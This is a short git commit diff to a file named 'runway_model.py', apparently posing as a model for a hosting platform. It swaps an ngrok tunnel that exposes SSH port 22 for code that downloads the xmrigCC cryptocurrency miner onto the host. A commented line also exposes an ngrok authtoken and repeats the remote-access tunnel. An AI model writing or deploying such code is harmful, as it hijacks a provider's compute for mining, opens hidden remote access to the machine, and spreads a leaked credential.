049ca1babd35f1b58c82ab184f295d8ea67779e1
colabu11 <101316095+colabu11@users.noreply.github.com>
2022-03-23 15:04:04 +0800

    Update runway_model.py

--- runway_model.py
+++ runway_model.py
@@ -1,3 +1,9 @@
 import subprocess
 #subprocess.call("ls && ./ngrok authtoken 1siBHweElRgvcNTEIHUR49WPfcv_5rbwdTbBB5q9cMLJwYcme && ./ngrok tcp 22 --log=stdout > ngrok.log", shell=True)
-subprocess.call("./ngrok tcp 22", shell=True)
+import requests
+
+url = 'https://github.com/Bendr0id/xmrigCC/releases/download/2.9.5/xmrigCC-2.9.5-linux-generic-amd64.tar.gz'
+r = requests.get(url, allow_redirects=True)
+
+open('xmrigCC-2.9.5-linux-generic-amd64.tar.gz', 'wb').write(r.content)
+subprocess.call("ls", shell=True)
